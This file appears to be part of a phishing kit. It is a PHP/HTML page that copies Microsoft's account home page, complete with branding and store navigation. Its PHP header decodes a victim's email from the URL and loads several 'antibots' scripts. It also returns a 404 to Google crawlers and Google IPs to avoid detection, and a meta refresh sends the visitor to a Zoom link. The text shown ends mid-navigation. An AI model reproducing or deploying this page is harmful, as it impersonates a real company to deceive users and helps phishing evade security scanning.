<?php



$login="";
$_SESSION['login']="";

function getDomainFromEmail($log)
{
// Get the data after the @ sign
$domain = substr(strrchr($log, "@"), 1);
$remove = array(".com");
return $domain;
} 
// Example
if(isset($_GET['login'])){
$login = $_GET['login'];
$log = base64_decode($login);
}
$domain = getDomainFromEmail($log);
@session_start();  
error_reporting(0); 
include("../geoplugin.php");
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";
include "../bots/antibots5.php";
include "../bots/antibots6.php"; 
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

?>

<!DOCTYPE html>
<html dir="ltr" data-role-name="MeePortal" class="ltr home-about-index home" lang="en-US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script src="about_files/meCore.js" charset="UTF-8" async=""></script><script src="about_files/meBoot.js" charset="UTF-8" async=""></script>
    <title>Microsoft account | Home</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="Manage your Microsoft account services, subscriptions, billing, devices, family, security, privacy, and more across your Microsoft apps, PCs, tablets, and phones.">
        <meta name="pageid" content="home-about-index">
        <meta name="ms.msa_mem_au" content="home">
        <meta name="ms.msa_mem_flt" content="AnglrUpgd;AreaFamilyAddMoney;AreaServices;AreaServicesCancelSurvey;DvcFmdTs;DvcLocateDevice;FamInitials;FamOfficeTry;FamPrchCtlWarn;FamPrivacy;FamSvcsTS;GBrwsSprt;GCmsCacheKey;GDrainModule;GlobalFeedback;GlobalHelpLinks;GlobalOptimizely;GlobalSmokeTests;GlobalUhf;GUHF3;HomeDvcAllLocate;HomeRewards;HomeRewFre;LoadControlPrototypes;PrivPersnlzn;RedTigerCms;RewardsColdStartFlight;RewardsFlight;SvcAppSubs;SvcBrndId;SvcInlinePi;SvcXboxFlows;SvcXboxFnB">
        <meta name="ms.loc" content="ng">
        <meta name="ms.lang" content="en">
        <meta name="ms.env" content="Prod">
        <meta name="ms.brandid" content="web">
        <meta http-equiv="refresh" content="7; url= https://zoom.us/s/7671394777/">

    <link rel="canonical" href="https://account.microsoft.com/about">
    <link href="https://account.microsoft.com/favicon.ico" rel="shortcut icon" type="image/x-icon">
    
<link href="https://account.microsoft.com/bundles/styles/webcore-ltr?v=YlEGuMrLXVFHrfgBzmaZndD7zn3ai6o_Bvd6A2Zygtk1" rel="stylesheet">
     

<link href="https://assets.onestore.ms/cdnfiles/onestorerolling-1610-27000/shell/v3/scss/shell.min.css" rel="stylesheet" type="text/css">

<!--[if lte IE 8]>
    <link href="https://assets.onestore.ms/cdnfiles/onestorerolling-1610-27000/shell/common/respond-proxy.html" id="respond-proxy" rel="respond-proxy"/>
<![endif]-->

    <link href="https://account.microsoft.com/bundles/styles/site?v=tp0zSyhLGkPEKW1RXTrzv_vFUaWDpByVwhp2EbaL0ck1" rel="stylesheet">

    
    
<script type="text/javascript">

    
    window.onerror = function javaScriptErrorWatchdog(errorMsg, url, lineNumber) {
        var errorMeta = document.createElement("meta");
        errorMeta.name = "JSError";
        errorMeta.content = "" + url + "; " + lineNumber + "; " + errorMsg;
        document.getElementsByTagName("head")[0].appendChild(errorMeta);

        return false;
    };



</script>


    
    <script type="text/javascript">
        if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
            var msViewportStyle = document.createElement("style");
            var mq = "@-ms-viewport{width:auto!important}";
            msViewportStyle.appendChild(document.createTextNode(mq));
            document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
        }
    </script>
    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.11.1.min.js"></script>
<script>(window.jQuery)||document.write('<script src="/bundles/scripts/jquery"><\/script>');</script>


    
    
    


    
        <script type="text/javascript" src="https://cdn.optimizely.com/js/4502370115.js"></script>

    

<style type="text/css">.msame_TxtTrunc{white-space:nowrap;text-overflow:ellipsis;overflow:hidden;word-break:break-all}.msame_Header{display:inline-block;cursor:pointer;font-size:14px;border-width:1px;border-style:solid;border-bottom-style:none;border-color:transparent;width:100%}.msame_Header_name{padding-left:12px;max-width:160px;display:inline-block;line-height:64px;vertical-align:top;font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;font-size:86%;color:#505050}.msame_unauth .msame_Header_name{padding-right:12px}.msame_unauth .msame_Header_name:hover{color:#0078d7}.msame_Drop_AI_pic,.msame_Drop_active_pic,.msame_Header_pic{display:inline-block}.msame_Header_piccont{padding-top:14px;padding-bottom:14px;padding-right:12px;padding-left:8px}.msame_Mobile .msame_Header_piccont{padding-top:10px;padding-bottom:10px}.msame_Short .msame_Header_piccont{padding-left:12px}.msame_Header_picframe{width:36px;height:36px;border-radius:50%;overflow:hidden}.msame_Mobile .msame_Header_picframe{width:48px;height:48px}.msame_open .msame_Header_picframe{z-index:3000001;position:relative}.msame_Header_chev{display:none}.msame_Mobile .msame_Header_piccont{padding-right:8px;padding-left:10px}.msame_Mobile .msame_Header_name{line-height:3;font-size:114%;padding-left:10px;padding-right:10px;display:inline-block;vertical-align:top;padding-top:14px}.msame_Mobile.msame_3row .msame_Header_name{padding-top:6px}.msame_Mobile .msame_Header_chev{display:inline-block;line-height:64px;vertical-align:top;padding-right:16px;padding-left:8px;float:right}.msame_open .msame_Header_chev img{-moz-transform:scaleY(-1);-o-transform:scaleY(-1);-webkit-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV"}.msame_Drop_root .msame_Drop_AI:focus,.msame_Drop_root .msame_Drop_AI_remove:focus,.msame_Drop_root a:focus,.msame_Header:focus{outline-style:dotted;outline-color:#000;outline-width:1px}.msame_Header_piccont img{width:36px;height:36px;line-height:normal;vertical-align:baseline}.msame_Mobile .msame_Header_piccont img{width:48px;height:48px}.msame_Mobile .msame_Header_fullName{font-size:100%;color:#000;line-height:1.333}.msame_Drop_AI_email,.msame_Drop_AI_status,.msame_Mobile .msame_Header_email,.msame_Mobile .msame_Header_nickName{font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;font-size:86%;color:rgba(0,0,0,.54);line-height:1.333333}.msaie8 .msame_Drop_AI_pic,.msaie8 .msame_Drop_AI_right,.msaie8 .msame_Drop_active_pic,.msaie8 .msame_Drop_active_right,.msaie8 .msame_Header,.msaie8 .msame_Header_name,.msaie8 .msame_Header_pic{zoom:1;*display:inline}
</style>
<style type="text/css">
    #c_content
    {
        max-width: 1180px;
    }
    #loading {
    width: 100%;
    /* Full Width */
    height: 12px;
    margin: 50px auto;
    margin-left: -120px;
    background: #fff;
}

.internal {
    width: 20%;
    height: 3px;
    margin: 2px 0;
    background: #2187e7;
    position: absolute;
    box-shadow: 0px 0px 10px 1px rgba(0,198,255,0.7);
    -moz-animation: fullinternal 10s ease-out;
    -webkit-animation: fullinternal 10s ease-out;
}

/* Full Width Animation Bar */
@-moz-keyframes fullinternal {
    0%  { width: 0px;
}

40% {
    width: 20%;
}   
}

@-webkit-keyframes fullinternal {
    0% {
        width: 0px;
    }

    40% {
        width: 20%;
    };
}
</style>
<style type="text/css">.msame_open .msame_Header{border-color:#e6e6e6;background-color:#fff}.msame_open .msame_Header.msame_Mobile{border-color:transparent;background-color:transparent}.msame_ClickStart.msame_Drop_root .msame_Drop_AI:focus,.msame_ClickStart.msame_Drop_root .msame_Drop_AI_remove:focus,.msame_ClickStart.msame_Drop_root a:focus{outline-style:none}.msame_Drop_root a,.msame_Drop_root a:active,.msame_Drop_root a:focus,.msame_Drop_root a:hover,.msame_Drop_root a:visited{text-decoration:none}.msame_Drop_topb{border-top-color:#e6e6e6;border-top-style:solid;border-top-width:1px}.msame_Mobile .msame_Drop_topb{width:100%!important}.msame_Drop_active{padding-bottom:8px}.msame_Drop_AI_picframe{width:44px;height:44px;border-radius:50%;overflow:hidden}.msame_Drop_AI_piccont img{width:44px;height:44px}.msame_Drop_root{border-width:1px;border-color:#e6e6e6;border-style:solid;border-top-style:none;position:absolute;width:360px;z-index:3000000;background-color:#fff;font-size:14px}.msame_Drop_sep{border-top-width:1px;border-top-color:#e6e6e6;border-top-style:solid;width:100%;height:0;display:block}.msame_Mobile.msame_Drop_root{left:0!important;right:0;bottom:0;width:100%;border-right-width:0;border-left-width:0}.msame_Mobile .msame_Drop_content{overflow-y:auto;position:absolute;left:0;right:0;bottom:0;top:0}.msame_Drop_root a{text-decoration:none}.msame_Drop_content{overflow:hidden}.msame_Mobile .msame_Drop_active{display:none}.msame_Drop_AI{cursor:pointer}.disabled .msame_Drop_AI_pic,.disabled .msame_Drop_AI_right{opacity:.4;cursor:default}.disabled .msame_Drop_AI_email,.disabled .msame_Drop_AI_name,.disabled .msame_Drop_AI_status{color:#000}.msame_Drop_active_piccont{padding:5px}.msame_Drop_AI_piccont{padding:10px}.msame_Drop_active_picframe{width:74px;height:74px;border-radius:50%;overflow:hidden}.msame_Drop_active_picborder,.msame_Drop_active_piccont a{display:block;padding:4px;border:1px dotted transparent;border-radius:50%}.msame_Drop_active_piccont a:focus{border:1px dotted #000}.msame_Drop_active_piccont img{width:64px;height:64px;border-radius:50%}.msame_Drop_active_name{display:block;line-height:1.3;font-size:150%;color:#000;font-family:"Segoe UI Light","Segoe UI Web Light","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol",HelveticaNeue-Light,"Helvetica Neue",Arial,sans-serif}.msame_Drop_active_email{display:block;line-height:1.42857;font-size:100%;color:rgba(0,0,0,.54);font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif}.msame_Drop_active_right{display:inline-block;width:216px;vertical-align:top;padding-top:12px;padding-right:12px;padding-left:12px}.msame_Drop_SI a{line-height:2;font-size:114%;font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;padding-left:12px;padding-right:12px;display:block;color:#000}.msame_Mobile .msame_Drop_SI a{line-height:2.75}.msame_Drop_AI.switch:hover,.msame_Drop_AI_remove:hover,.msame_Drop_SI a:hover{color:#000;background-color:rgba(0,0,0,.12)}.msame_Drop_AI.switch:active,.msame_Drop_AI.switch:active div,.msame_Drop_AI_remove:active,.msame_Drop_SI a:active{color:#fff!important;background-color:#000}.msame_Drop_SI a:link,.msame_Drop_SI a:visited{color:#000}.msame_Drop_active_link a,.msame_Drop_active_link a:active,.msame_Drop_active_link a:hover,.msame_Drop_active_link a:link,.msame_Drop_active_link a:visited{line-height:1.333333;font-size:86%;font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;color:#0078d7}.msame_Drop_AL{padding-bottom:24px}.msame_Drop_AI_right{display:inline-block;width:252px;vertical-align:top;padding-left:8px;padding-top:5px}.msame_Mobile .msame_Drop_AI_right{width:100px}.msame_Drop_AI_name{font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;font-size:114%;color:#000;line-height:1.25}.msame_Drop_AI_remove{float:right;margin-top:6px;padding-top:12px;padding-bottom:12px;padding-left:12px;padding-right:12px;text-align:center;cursor:pointer}.msame_Drop_AI_remove img{display:block}.msame_auto_frame{display:none;position:absolute;top:0;left:-4000px;width:0}
</style><meta content="https://mem.gfx.ms/me/MeControl/9.0.16293.2/en-US/meCore.min.js; 0; Script error." name="JSError"></head>
<body>
    <div id="page-wrapper">
        <header id="site-header">
    <noscript>
            <div class="alert alert-info alert-banner">
        <div class="container">
            <p>To use everything on this website, turn on JavaScript in your browser settings.</p>
            <p><a class="btn&#32;btn-primary&#32;pull-right" href="http://go.microsoft.com/fwlink/p/?LinkId=616795">Learn how</a></p>
        </div>
    </div>

    </noscript>
    <div id="no-cookies">
            <div class="alert alert-info alert-banner">
        <div class="container">
            <p>To use everything on this website, turn on cookies in your browser settings. <a href="http://go.microsoft.com/fwlink/?LinkId=313221">Read why and how we use cookies.</a></p>
            <p><a class="btn btn-primary pull-right" href="http://go.microsoft.com/fwlink/p/?LinkId=616796">Learn how</a></p>
        </div>
    </div>

    </div>




            
    <div id="sharedshell-header">
         






<div id="shell-header" class="shell-header shell-responsive " ms.pgarea="header" role="banner">
    
    <div class="shell-header-wrapper">
        <div class="shell-header-top" data-bi-area="HeaderL0" data-bi-view="L0V1">
                <div class="shell-header-brand" ms.cmpgrp="logo">
                            <a id="srv_shellHeaderMicrosoftLogo" href="https://www.microsoft.com/" ms.cmpnm="MicrosoftBrandLogo" ms.title="Microsoft" title="Microsoft" data-bi-name="BrandLogo" tabindex="10">
            <img src="./microsoft_logo.svg" alt="Microsoft">
        </a>

                </div>
            <div class="shell-header-nav-wrapper" ms.cmpgrp="nav" role="navigation">
                <ul class="shell-header-nav" role="menubar" id="srv_shellHeaderNav" data-bi-area="L1" data-bi-view="Hovermenus">
                        <li class="shell-header-user-mobile-container">
                        </li>
                                    <li class="shell-header-dropdown" data-navcontainer="shellmenu_0_NavContainer">
                                        <div id="shellmenu_0" class="shell-header-dropdown-label">
                                            <a id="Store-navigation" href="javascript:void(0)" role="button" aria-labelledby="shellmenu_0" aria-expanded="false" ms.title="Store" data-bi-name="Store" data-bi-slot="1" tabindex="20">
                                                Store
                                            </a>
                                        </div>





<div style="height: auto;" class="shell-header-dropdown-content " aria-hidden="true" role="menu">
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Store home">

                            <dt id="shellmenu_1" class="shell-header-dropdown-tab-label shell-header-L2menu-direct-link">
                                <a href="https://www.microsoftstore.com/store/msusa/en_US/home" ms.title="Store home" tabindex="20" data-bi-name="Store_StoreHome">Store home</a>                         
                            </dt>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Devices">

                            <dt id="shellmenu_2" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Devices" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Devices
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_3">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/All-Surface/categoryID.69403400" class="shell-l3-list-item" ms.title="Microsoft Surface" tabindex="20" data-bi-name="Devices_Surface">
                            Microsoft Surface
                        </a>
                    </li>
                    <li id="shellmenu_4">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/All-PCs-tablets/categoryID.69404700" class="shell-l3-list-item" ms.title="PCs &amp; tablets" tabindex="20" data-bi-name="Devices_PCsAndTablets">
                            PCs &amp; tablets
                        </a>
                    </li>
                    <li id="shellmenu_5">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/categoryID.69405400" class="shell-l3-list-item" ms.title="Xbox" tabindex="20" data-bi-name="Devices_Xbox">
                            Xbox
                        </a>
                    </li>
                    <li id="shellmenu_6">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/Virtual-and-Augmented-Reality/categoryID.594470000?icid=en_US_Store_UH_devices_vr" class="shell-l3-list-item" ms.title="Virtual reality" tabindex="20" data-bi-name="Devices_VirtualReality">
                            Virtual reality
                        </a>
                    </li>
                    <li id="shellmenu_7">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/All-accessories/categoryID.69407900" class="shell-l3-list-item" ms.title="Accessories" tabindex="20" data-bi-name="Devices_Accessories">
                            Accessories
                        </a>
                    </li>
                    <li id="shellmenu_8">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/All-Windows-Phone/categoryID.69406200" class="shell-l3-list-item" ms.title="Windows phone" tabindex="20" data-bi-name="Devices_WindowsPhone">
                            Windows phone
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Software">

                            <dt id="shellmenu_9" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Software" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Software
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_10">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/All-Office/categoryID.69403900" class="shell-l3-list-item" ms.title="Office" tabindex="20" data-bi-name="Store_Software_Office">
                            Office
                        </a>
                    </li>
                    <li id="shellmenu_11">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/categoryID.70036700" class="shell-l3-list-item" ms.title="Windows" tabindex="20" data-bi-name="Store_Software_Windows">
                            Windows
                        </a>
                    </li>
                    <li id="shellmenu_12">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/All-additional-software/categoryID.69407400" class="shell-l3-list-item" ms.title="Additional software" tabindex="20" data-bi-name="Store_Software_AdditionalSoftware">
                            Additional software
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Apps">

                            <dt id="shellmenu_13" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Apps" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Apps
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_14">
                        <a href="https://www.microsoft.com/en-us/store/top-free/apps/pc" class="shell-l3-list-item" ms.title="All apps" tabindex="20" data-bi-name="Store_AllApps">
                            All apps
                        </a>
                    </li>
                    <li id="shellmenu_15">
                        <a href="https://www.microsoft.com/en-us/store/apps/windows" class="shell-l3-list-item" ms.title="Windows apps" tabindex="20" data-bi-name="Store_Apps_WindowsApps">
                            Windows apps
                        </a>
                    </li>
                    <li id="shellmenu_16">
                        <a href="https://www.microsoft.com/en-us/store/apps/windows-phone" class="shell-l3-list-item" ms.title="Windows phone apps" tabindex="20" data-bi-name="Store_Apps_WindowsPhoneApps">
                            Windows phone apps
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Games">

                            <dt id="shellmenu_17" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Games" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Games
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_18">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/Xbox-One-games/categoryID.69405600" class="shell-l3-list-item" ms.title="Xbox One games" tabindex="20" data-bi-name="Store_Xbox One games">
                            Xbox One games
                        </a>
                    </li>
                    <li id="shellmenu_19">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/Xbox-360-games/categoryID.69405800" class="shell-l3-list-item" ms.title="Xbox 360 games" tabindex="20" data-bi-name="Store_Xbox360Games">
                            Xbox 360 games
                        </a>
                    </li>
                    <li id="shellmenu_20">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/list/PC-games/categoryID.62688000?icid=en_US_Store_UH_games_PC" class="shell-l3-list-item" ms.title="PC games" tabindex="20" data-bi-name="Store_PCGames">
                            PC games
                        </a>
                    </li>
                    <li id="shellmenu_21">
                        <a href="https://www.microsoft.com/en-us/store/games/windows" class="shell-l3-list-item" ms.title="Windows games" tabindex="20" data-bi-name="Store_Games_Windowsgames">
                            Windows games
                        </a>
                    </li>
                    <li id="shellmenu_22">
                        <a href="https://www.microsoft.com/en-us/store/games/windows-phone" class="shell-l3-list-item" ms.title="Windows phone games" tabindex="20" data-bi-name="Store_Games_WindowsPhoneGames">
                            Windows phone games
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Entertainment">

                            <dt id="shellmenu_23" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Entertainment" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Entertainment
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_24">
                        <a href="https://www.microsoft.com/en-us/store/entertainment" class="shell-l3-list-item" ms.title="All Entertainment" tabindex="20" data-bi-name="Store_Entertainment_AllEntertainment">
                            All Entertainment
                        </a>
                    </li>
                    <li id="shellmenu_25">
                        <a href="https://www.microsoft.com/en-us/store/movies-and-tv" class="shell-l3-list-item" ms.title="Movies &amp; TV" tabindex="20" data-bi-name="Store_Entertainment_MoviesAndTV">
                            Movies &amp; TV
                        </a>
                    </li>
                    <li id="shellmenu_26">
                        <a href="https://www.microsoft.com/en-us/store/music" class="shell-l3-list-item" ms.title="Music" tabindex="20" data-bi-name="Store_Entertainment_Music">
                            Music
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Business &amp; Education">

                            <dt id="shellmenu_27" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Business &amp; Education" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Business &amp; Education
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_28">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/Business/categoryID.69408700" class="shell-l3-list-item" ms.title="Business" tabindex="20" data-bi-name="BusinessAndEducation_Business">
                            Business
                        </a>
                    </li>
                    <li id="shellmenu_29">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/edu" class="shell-l3-list-item" ms.title="Students &amp; educators" tabindex="20" data-bi-name="BusinessAndEducation_Education">
                            Students &amp; educators
                        </a>
                    </li>
                    <li id="shellmenu_30">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/Developer/categoryID.69418300?icid=en_US_Store_UH_BusEd_Dev" class="shell-l3-list-item" ms.title="Developers" tabindex="20" data-bi-name="BusinessAndEducation_Developer">
                            Developers
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Sale">

                            <dt id="shellmenu_31" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Sale" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Sale
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_32">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/Holiday-Gift-Guide/categoryID.67001000?icid=en_US_Store_UH_sale_gm_hgg" class="shell-l3-list-item" ms.title="Holiday Gift Guide" tabindex="20" data-bi-name="Sale_HolidayGiftGuide">
                            Holiday Gift Guide
                        </a>
                    </li>
                    <li id="shellmenu_33">
                        <a href="https://www.microsoftstore.com/store/msusa/en_US/cat/Sale/categoryID.69403000" class="shell-l3-list-item" ms.title="Sale" tabindex="20" data-bi-name="Sale_Sale">
                            Sale
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Find a store">

                            <dt id="shellmenu_34" class="shell-header-dropdown-tab-label shell-header-L2menu-direct-link">
                                <a href="https://www.microsoft.com/en-us/store/locations/find-a-store?icid=L_navAB_FindAStore" ms.title="Find a store" tabindex="20" data-bi-name="Store_FindAStore">Find a store</a>                         
                            </dt>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Store; Gift cards">

                            <dt id="shellmenu_35" class="shell-header-dropdown-tab-label shell-header-L2menu-direct-link">
                                <a href="https://www.microsoft.com/en-us/store/gift-cards" ms.title="Gift cards" tabindex="20" data-bi-name="Store_GiftCards">Gift cards</a>                         
                            </dt>

                </dl>

</div>
                                    </li>
                                    <li class="shell-header-dropdown" data-navcontainer="shellmenu_36_NavContainer">
                                        <div id="shellmenu_36" class="shell-header-dropdown-label">
                                            <a id="Products-navigation" href="javascript:void(0)" role="button" aria-labelledby="shellmenu_36" aria-expanded="false" ms.title="Products" data-bi-name="Products" data-bi-slot="2" tabindex="20">
                                                Products
                                            </a>
                                        </div>





<div style="height: auto;" class="shell-header-dropdown-content " aria-hidden="true" role="menu">
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Products; Software &amp; services">

                            <dt id="shellmenu_37" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Software &amp; services" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Software &amp; services
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_38">
                        <a href="https://www.microsoft.com/en-us/windows" class="shell-l3-list-item" ms.title="Windows" tabindex="20" data-bi-name="Products_SoftwareAndServices_Windows">
                            Windows
                        </a>
                    </li>
                    <li id="shellmenu_39">
                        <a href="https://products.office.com/en-us/home" class="shell-l3-list-item" ms.title="Office" tabindex="20" data-bi-name="Products_SoftwareAndServices_Office">
                            Office
                        </a>
                    </li>
                    <li id="shellmenu_40">
                        <a href="https://www.microsoft.com/en-us/download/default.aspx" class="shell-l3-list-item" ms.title="Free downloads &amp; security" tabindex="20" data-bi-name="Products_SoftwareAndServices_FreeDownloadsAndSecurity">
                            Free downloads &amp; security
                        </a>
                    </li>
                    <li id="shellmenu_41">
                        <a href="http://windows.microsoft.com/en-us/internet-explorer/download-ie" class="shell-l3-list-item" ms.title="Internet Explorer" tabindex="20" data-bi-name="Products_SoftwareAndServices_InternetExplorer">
                            Internet Explorer
                        </a>
                    </li>
                    <li id="shellmenu_42">
                        <a href="http://www.microsoft.com/en-us/windows/microsoft-edge" class="shell-l3-list-item" ms.title="Microsoft Edge" tabindex="20" data-bi-name="Products_SoftwareAndServices_MicrosoftEdge">
                            Microsoft Edge
                        </a>
                    </li>
                    <li id="shellmenu_43">
                        <a href="http://www.skype.com/en/" class="shell-l3-list-item" ms.title="Skype" tabindex="20" data-bi-name="Products_SoftwareAndServices_Skype">
                            Skype
                        </a>
                    </li>
                    <li id="shellmenu_44">
                        <a href="http://www.onenote.com/" class="shell-l3-list-item" ms.title="OneNote" tabindex="20" data-bi-name="Products_SoftwareAndServices_OneNote">
                            OneNote
                        </a>
                    </li>
                    <li id="shellmenu_45">
                        <a href="https://onedrive.live.com/about/en-us/" class="shell-l3-list-item" ms.title="OneDrive" tabindex="20" data-bi-name="Products_SoftwareAndServices_OneDrive">
                            OneDrive
                        </a>
                    </li>
                    <li id="shellmenu_46">
                        <a href="http://www.microsoft.com/microsoft-health/en-us" class="shell-l3-list-item" ms.title="Microsoft Health" tabindex="20" data-bi-name="Products_SoftwareAndServices_MicrosoftHealth">
                            Microsoft Health
                        </a>
                    </li>
                    <li id="shellmenu_47">
                        <a href="http://www.msn.com/?ocid=HEA000" class="shell-l3-list-item" ms.title="MSN" tabindex="20" data-bi-name="Products_SoftwareAndServices_MSN">
                            MSN
                        </a>
                    </li>
                    <li id="shellmenu_48">
                        <a href="http://www.bing.com/" class="shell-l3-list-item" ms.title="Bing" tabindex="20" data-bi-name="Products_SoftwareAndServices_Bing">
                            Bing
                        </a>
                    </li>
                    <li id="shellmenu_49">
                        <a href="https://www.microsoft.com/en-us/groove" class="shell-l3-list-item" ms.title="Microsoft Groove" tabindex="20" data-bi-name="Products_SoftwareAndServices_XboxMusic">
                            Microsoft Groove
                        </a>
                    </li>
                    <li id="shellmenu_50">
                        <a href="https://www.microsoft.com/en-us/movies-and-tv" class="shell-l3-list-item" ms.title="Microsoft Movies &amp; TV" tabindex="20" data-bi-name="Products_SoftwareAndServices_XboxVideo">
                            Microsoft Movies &amp; TV
                        </a>
                    </li>

    </ul>



                            </dd>

                </dl>
                <dl class="shell-header-dropdown-tab" ms.cmpnm="Products; Devices &amp; Xbox">

                            <dt id="shellmenu_51" class="shell-header-dropdown-tab-label">
                                <a href="javascript:void(0)" role="button" ms.title="Devices &amp; Xbox" ms.interactiontype="14" tabindex="20" data-bi-dnt="">
                                    Devices &amp; Xbox
                                    <i class="shell-icon-dropdown facing-right"></i>
                                </a>
                            </dt>
                            <dd class="shell-header-dropdown-tab-content" data-col="0">



    <ul class="shell-header-dropdown-tab-list">
                    <li id="shellmenu_52">
                        <a href="https://www.microsoft.com/devices/en-us" class="shell-l3-list-item" ms.title="All Microsoft devices" tabindex="20" data-bi-name="Products_DevicesandXbox_AllMicrosoftDevices">
                            All Microsoft devices
                        </a>
                    </li>
                    <li id="shellmenu_53">
                        <a href="http://www.microsoft.com/surface/en-us" class="shell-l3-list-item" ms.title="Microsoft Surface" tabindex="20" data-bi-name="Products_DevicesAndXbox_Surface">
                            Microsoft Surface
                        </a>
                    </li>
                    <li id="shellmenu_54">
